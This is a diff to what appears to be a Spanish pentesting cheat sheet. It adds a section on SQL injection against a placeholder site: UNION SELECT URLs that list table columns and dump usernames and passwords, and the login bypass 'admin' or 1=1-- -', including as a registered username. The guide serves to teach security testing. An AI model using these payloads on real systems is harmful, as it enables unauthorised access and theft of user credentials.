@@ -966,7 +966,7 @@ for i in $(seq 1 200); do
 done
 ```
 
-Obtendremos resultados como los siguientes:
+Obteniendo resultados como los siguientes:
 
 ```bash
 Para el número 63: CABECERA
@@ -981,6 +981,31 @@ Para el número 71: NOTICIAS
 Para el número 72: PERMISOS
 Para el número 73: USUARIOS
 ```
+
+Una vez localizada la tabla que nos interese (para este caso, la tabla **usuarios**), enumeramos las columnas existentes para dicha tabla en la base de datos:
+
+`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_name=char(117,115,117,97,114,105,111,115)-- -`
+
+Es necesario para este paso convertir la cadena **usuarios** de STRING a formato ASCII. Obtendremos los siguientes resultados:
+
+`IDUSUARIO,IDEMPRESA,USUARIO,PASSWORD,NOMBRE,ADMINISTRADOR`
+
+Una vez sabiendo los nombres de las columnas, aprovechamos la funcionalidad _group_concat_ para concatenar todas las columnas cuyos datos queramos visualizar:
+
+`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(usuario,0x3a,password),3,4,5+from+usuarios--%20-`
+
+Obteniendo el usuario y contraseña de acceso.
+
+Antes de complicarse, preferible probar inyecciones básicas sobre paneles de autenticación, esto es:
+
+```bash
+Usuario: admin' or 1=1-- -
+Password: admin' or 1=1-- -
+```
+
+Para casos donde podamos llevar a cabo un nuevo registro de usuario, otra vía es crear un usuario con nombre **admin' or 1=1-- -** y password **admin' or 1=1-- -**, de esta forma tras posteriormente realizar la autenticación como usuario válido, tendremos acceso a todos los datos de los usuarios en la base de datos principal.
+
+
 
 ### Pentesting Linux
 
